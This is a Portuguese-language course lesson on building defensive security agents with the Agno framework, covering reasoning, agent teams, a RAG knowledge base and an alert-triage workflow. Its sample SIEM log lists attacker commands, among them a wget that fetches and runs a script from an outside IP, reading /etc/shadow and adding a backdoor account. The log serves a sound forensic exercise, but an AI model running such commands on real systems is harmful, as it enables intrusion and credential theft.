# 🛡️ Agentes de IA para Blue Teams — Dia 5: Agno Avançado

> **Duração estimada:** ~1 hora  
> **Pré-requisito:** Dias 1 a 5 concluídos  
> **Objetivo:** Explorar os recursos avançados do Agno (reasoning, teams, knowledge e workflows

---

## 📋 O que vamos fazer hoje

1. Reasoning — agentes que pensam antes de responder
2. Teams — múltiplos agentes colaborando
3. Knowledge — base de conhecimento interna
4. Workflows — pipelines determinísticos com IA


---

## 1. Reasoning — Raciocínio Explícito

### O que é?

Quando ativamos `reasoning`, o agente executa um ciclo interno de **pensar antes de agir**. Ele decompõe o problema, considera hipóteses e só então gera a resposta — similar ao modo thinking que vimos com os modelos `o3/o4-mini`, mas disponível para qualquer modelo.

**Benefícios em segurança:**
- Respostas muito mais precisas em incidentes complexos
- Menos "pulos" para conclusões erradas
- Raciocínio auditável — você vê o processo de pensamento

```python
# reasoning_agent.py
from dotenv import load_dotenv
from agno.agent import Agent
from agno.models.openai import OpenAIChat
from agno.reasoning import ReasoningAgent  # Wrapper de reasoning

load_dotenv()

agente = Agent(
    name="Analista Forense",
    model=OpenAIChat(id="gpt-5.6"),
    description="Analista forense digital especializado em resposta a incidentes.",
    instructions=[
        "Analise cada evidência individualmente antes de correlacionar",
        "Considere hipóteses alternativas antes de concluir",
        "Indique o nível de confiança da sua análise: ALTO | MÉDIO | BAIXO",
    ],
    reasoning=True,      # Ativa raciocínio passo a passo
    markdown=True,
)

# Cenário complexo que se beneficia de raciocínio profundo
cenario = """
Eventos detectados no SIEM — Servidor web prod-01 (192.168.10.5):

03:14:22 - SSH login bem-sucedido: root de 185.220.101.45 (RU)
03:14:58 - Comando: wget http://185.220.101.45/update.sh -O /tmp/.update
03:15:01 - Comando: chmod +x /tmp/.update && /tmp/.update
03:15:03 - Novo processo: /tmp/.update (PID 9821)
03:15:04 - Conexão TCP de saída: 185.220.101.45:4444 (persistente)
03:15:31 - Leitura: /etc/shadow, /etc/passwd
03:16:44 - Comando: useradd -m -s /bin/bash svc_monitor
03:17:02 - Comando: echo 'svc_monitor:P@ssw0rd123' | chpasswd
03:17:45 - Varredura interna: 192.168.10.0/24 porta 22 (de prod-01)
03:18:12 - SSH login bem-sucedido: svc_monitor de 192.168.10.5 → prod-db (192.168.10.15)

Contexto: prod-01 é servidor web público. prod-db contém dados de clientes.
prod-db não deveria ter comunicação SSH com prod-01.
"""

agente.print_response(
    f"Analise esta sequência de eventos e determine:\n"
    f"1. O que aconteceu (timeline da intrusão)?\n"
    f"2. Qual é o nível de comprometimento atual?\n"
    f"3. Quais ações imediatas devem ser tomadas?\n\n{cenario}",
    stream=True,
)
```

---

## 2. Teams — Múltiplos Agentes Colaborando

### Por que Times de Agentes?

Um único agente generalista é bom. Mas para tarefas complexas, é mais eficaz ter **agentes especializados** colaborando — como uma equipe real de SOC.

**Modelos de colaboração no Agno:**

| Modo | Como funciona | Quando usar |
|------|--------------|-------------|
| `route` | Líder direciona para o especialista certo | Triagem de diferentes tipos de incidente |
| `collaborate` | Agentes discutem e chegam a consenso | Análises que precisam de múltiplas perspectivas |
| `coordinate` | Agentes executam em paralelo, líder consolida | Investigações com múltiplas fontes simultâneas |

---

### Exemplo: Time de Resposta a Incidentes

```python
# team_soc.py
from dotenv import load_dotenv
from agno.agent import Agent
from agno.models.openai import OpenAIChat
from agno.team import Team, TeamMode
from agno.tools.websearch import WebSearchTools

load_dotenv()

# ── Agente 1: Especialista em Network ────────────────────────────
analista_network = Agent(
    name="Network Analyst",
    model=OpenAIChat(id="gpt-4o-mini"),
    description="Especialista em análise de tráfego de rede e IOCs de IP/domínio.",
    instructions=[
        "Analise IPs, domínios e padrões de tráfego",
        "Identifique técnicas MITRE ATT&CK relacionadas à rede",
        "Foque em: lateral movement, C2, exfiltração",
    ],
    tools=[WebSearchTools()],
    markdown=True,
)

# ── Agente 2: Especialista em Endpoint ───────────────────────────
analista_endpoint = Agent(
    name="Endpoint Analyst",
    model=OpenAIChat(id="gpt-4o-mini"),
    description="Especialista em análise de endpoints, processos e artefatos de malware.",
    instructions=[
        "Analise processos, arquivos, registry e persistence mechanisms",
        "Identifique técnicas MITRE ATT&CK relacionadas ao endpoint",
        "Foque em: execution, persistence, privilege escalation",
    ],
    markdown=True,
)

# ── Agente 3: Especialista em Threat Intelligence ─────────────────
analista_ti = Agent(
    name="Threat Intel Analyst",
    model=OpenAIChat(id="gpt-4o-mini"),
    description="Especialista em Threat Intelligence e atribuição de ataques.",
    instructions=[
        "Correlacione IOCs com grupos de ameaça conhecidos",
        "Identifique TTPs e padrões de ataque",
        "Pesquise em fontes públicas de inteligência",
    ],
    tools=[WebSearchTools()],
    markdown=True,
)

# ── Líder: Incident Commander ──────────────────────────────────────
incident_commander = Team(
    name="SOC Incident Response Team",
    mode=TeamMode.coordinate,     # Coordena todos em paralelo e consolida
    model=OpenAIChat(id="gpt-4o"),  # Modelo mais capaz para o líder
    members=[analista_network, analista_endpoint, analista_ti],
    description="Time de resposta a incidentes que coordena múltiplos especialistas.",
    instructions=[
        "Distribua a investigação entre os especialistas conforme suas áreas",
        "Consolide as análises em um relatório unificado",
        "Priorize ações de contenção imediata",
        "Produza um relatório final estruturado com: Sumário Executivo, "
        "Timeline, Análise Técnica, Atribuição e Plano de Remediação",
    ],
    markdown=True,
)

# Incidente a ser investigado
incident_commander.print_response(
    "Temos um incidente em andamento. "
    "IP 185.220.101.45 (Tor exit node) fez login SSH como root no prod-01. "
    "Detectamos execução de script malicioso, criação de backdoor e "
    "movimentação lateral para o banco de dados. "
    "Investiguem em paralelo e me deem um relatório completo.",
    stream=True,
)
```

---

## 3. Knowledge — Base de Conhecimento Interna

### O que é Knowledge?

Knowledge permite que o agente tenha acesso a uma **base de conhecimento própria** — documentos, runbooks, políticas, playbooks — que ele consulta automaticamente via RAG (Retrieval Augmented Generation).

**Aplicações em segurança:**
- Playbooks de resposta a incidentes da empresa
- Políticas de segurança internas
- Documentação de infraestrutura
- CVEs e advisories relevantes
- IOCs históricos

```bash
# Instalar dependência para knowledge (vector store local)
uv add lancedb tantivy
```

```python
# agente_com_knowledge.py
from dotenv import load_dotenv
from agno.agent import Agent
from agno.models.openai import OpenAIChat
from agno.knowledge.text import TextKnowledgeBase
from agno.vectordb.lancedb import LanceDb
from agno.embedder.openai import OpenAIEmbedder

load_dotenv()

# ── Criando a base de conhecimento ───────────────────────────────────
knowledge_base = TextKnowledgeBase(
    path="knowledge/",          # Pasta com seus documentos
    vector_db=LanceDb(
        table_name="soc_knowledge",
        uri="tmp/lancedb",
        embedder=OpenAIEmbedder(id="text-embedding-3-small"),
    ),
)

# Carrega os documentos na primeira execução
# (nas próximas, já está no banco — comente esta linha)
knowledge_base.load(recreate=False)

# ── Agente que usa a knowledge base ──────────────────────────────────
agente = Agent(
    name="SOC Assistant",
    model=OpenAIChat(id="gpt-4o-mini"),
    knowledge=knowledge_base,
    description="""Assistente do SOC com acesso aos playbooks e políticas da empresa.
    Sempre consulte a base de conhecimento antes de responder.""",
    instructions=[
        "Consulte sempre os playbooks internos quando disponíveis",
        "Cite o documento fonte quando usar informações da knowledge base",
        "Se não encontrar na knowledge base, indique que está usando conhecimento geral",
    ],
    search_knowledge=True,   # Permite ao agente buscar na knowledge base
    markdown=True,
)

agente.print_response(
    "Nosso playbook de ransomware diz para isolar o sistema imediatamente? "
    "Qual o procedimento completo?",
    stream=True,
)
```

**Estrutura da pasta `knowledge/`:**

```
knowledge/
├── playbook-ransomware.md
├── playbook-phishing.md
├── playbook-data-exfiltration.md
├── politica-resposta-incidentes.pdf
├── arquitetura-infraestrutura.md
└── iocs-historicos.txt
```

**Exemplo de conteúdo de playbook:**

```markdown
# knowledge/playbook-ransomware.md

## Playbook: Resposta a Ransomware
**Versão:** 2.1 | **Última atualização:** Jan 2025

### Fase 1 — Identificação (0-15 min)
1. Confirmar criptografia de arquivos via extensão anômala
2. Verificar nota de resgate (geralmente README.txt ou similar)
3. Identificar vetor de entrada via logs de autenticação
4. Identificar Patient Zero (primeiro sistema afetado)

### Fase 2 — Contenção (15-30 min)
1. **ISOLAR IMEDIATAMENTE** o(s) sistema(s) afetado(s) da rede
   - Desconectar cabo de rede OU desabilitar NIC via IPMI
   - NÃO desligar o sistema (preserva evidências em memória)
2. Bloquear comunicação com domínios/IPs do C2 no firewall
3. Suspender contas comprometidas no AD
4. Notificar: CISO, Jurídico, Comunicação

### Fase 3 — Erradicação
...
```

---

## 4. Workflows — Pipelines com IA

### O que é um Workflow?

Um Workflow no Agno é uma sequência **determinística** de etapas, onde cada etapa pode usar IA. Diferente de um agente que decide o que fazer, um workflow segue um caminho predefinido — com IA dentro de cada passo.

**Quando usar workflow vs agente:**

| | Agente | Workflow |
|-|--------|---------|
| **Fluxo** | Decide dinamicamente | Predefinido e controlado |
| **Previsibilidade** | Menor | Alta |
| **Auditoria** | Mais difícil | Fácil |
| **Quando usar** | Investigações abertas | Processos padronizados |

**Exemplo em segurança:** Um workflow de triagem de alertas sempre executa os mesmos passos, na mesma ordem, para cada alerta.

```python
# workflow_triagem.py
from dotenv import load_dotenv
from typing import Iterator
from agno.workflow import Workflow, RunResponse, RunEvent
from agno.agent import Agent
from agno.models.openai import OpenAIChat
from agno.storage.sqlite import SqliteStorage

load_dotenv()

class TriagemAlertaWorkflow(Workflow):
    """
    Workflow de triagem de alertas de segurança em 3 etapas:
    1. Classificação inicial (severidade e tipo)
    2. Enriquecimento com contexto
    3. Geração de ticket com ações
    """
    
    description = "Pipeline de triagem automatizada de alertas de segurança"
    
    # ── Agentes especializados para cada etapa ────────────────────
    classificador: Agent = Agent(
        name="Classificador",
        model=OpenAIChat(id="gpt-4o-mini"),
        instructions=[
            "Classifique o alerta em: tipo, severidade (CRÍTICO/ALTO/MÉDIO/BAIXO) e se é provável falso positivo",
            "Responda em formato JSON: {tipo, severidade, falso_positivo, confianca}",
        ],
    )
    
    enriquecedor: Agent = Agent(
        name="Enriquecedor",
        model=OpenAIChat(id="gpt-4o-mini"),
        instructions=[
            "Adicione contexto ao alerta: técnicas MITRE ATT&CK, TTPs, possível impacto",
            "Considere o histórico de alertas similares",
        ],
    )
    
    gerador_ticket: Agent = Agent(
        name="Gerador de Ticket",
        model=OpenAIChat(id="gpt-4o-mini"),
        instructions=[
            "Gere um ticket de incidente estruturado com: título, descrição, ações imediatas, responsável sugerido",
            "Use linguagem clara para analistas L1 e L2",
        ],
    )
    
    def run(self, alerta: str) -> Iterator[RunResponse]:
        """Executa o pipeline de triagem."""
        
        yield RunResponse(
            event=RunEvent.workflow_started,
            content=f"🔍 Iniciando triagem do alerta..."
        )
        
        # ── Etapa 1: Classificação ────────────────────────────────
        yield RunResponse(content="**Etapa 1/3: Classificação inicial**\n")
        
        classificacao = self.classificador.run(
            f"Classifique este alerta:\n{alerta}",
            stream=False,
        )
        resultado_class = classificacao.content
        
        yield RunResponse(content=f"Classificação: {resultado_class}\n\n")
        
        # ── Etapa 2: Enriquecimento ───────────────────────────────
        yield RunResponse(content="**Etapa 2/3: Enriquecimento com contexto**\n")
        
        enriquecimento = self.enriquecedor.run(
            f"Alerta original:\n{alerta}\n\nClassificação:\n{resultado_class}\n\n"
            f"Adicione contexto de threat intelligence e técnicas MITRE ATT&CK.",
            stream=False,
        )
        resultado_enrich = enriquecimento.content
        
        yield RunResponse(content=f"{resultado_enrich}\n\n")
        
        # ── Etapa 3: Geração do Ticket ───────────────────────────
        yield RunResponse(content="**Etapa 3/3: Gerando ticket de incidente**\n")
        
        ticket = self.gerador_ticket.run(
            f"Com base nesta análise completa, gere o ticket de incidente:\n\n"
            f"Alerta: {alerta}\n"
            f"Classificação: {resultado_class}\n"
            f"Contexto: {resultado_enrich}",
            stream=False,
        )
        
        yield RunResponse(
            event=RunEvent.workflow_completed,
            content=ticket.content,
        )


# Executando o workflow
workflow = TriagemAlertaWorkflow(
    storage=SqliteStorage(
        table_name="triagem_workflow",
        db_file="tmp/workflows.db",
    ),
)

alerta_exemplo = """
ALERTA SIEM - ID: SEC-2025-0847
Timestamp: 2025-03-15 03:14:22 UTC
Severidade detectada: HIGH
Evento: SSH_LOGIN_ROOT_EXTERNAL
Host: prod-web-01 (192.168.10.5)
IP Origem: 185.220.101.45 (AS: Tor Project, País: RU)
Usuário: root
Método auth: password
Tentativas anteriores: 47 (últimos 5 min)
"""

workflow.print_response(alerta_exemplo, stream=True, markdown=True)
```

---

## ✅ Checklist do Dia 5

- [ ] Testou reasoning e viu o raciocínio passo a passo
- [ ] Criou um Team com pelo menos 2 agentes especializados
- [ ] Entendeu a diferença entre Team e Workflow
- [ ] Criou (ou entendeu) uma knowledge base com documentos da empresa
- [ ] Consegue ver tool calls e histórico na interface visual

---

## 📚 Referências

- [Agno — Reasoning](https://docs.agno.com/reasoning/overview)
- [Agno — Teams](https://docs.agno.com/teams/overview)
- [Agno — Knowledge](https://docs.agno.com/knowledge/overview)
- [Agno — Workflows](https://docs.agno.com/workflows/overview)

---

> **Próxima aula (Dia 6):** Interfaces — AgentOS, AgentUI e Gradio. Servindo seus agentes com FastAPI — do zero ao endpoint REST, streaming, autenticação básica e deploy de um sistema completo.
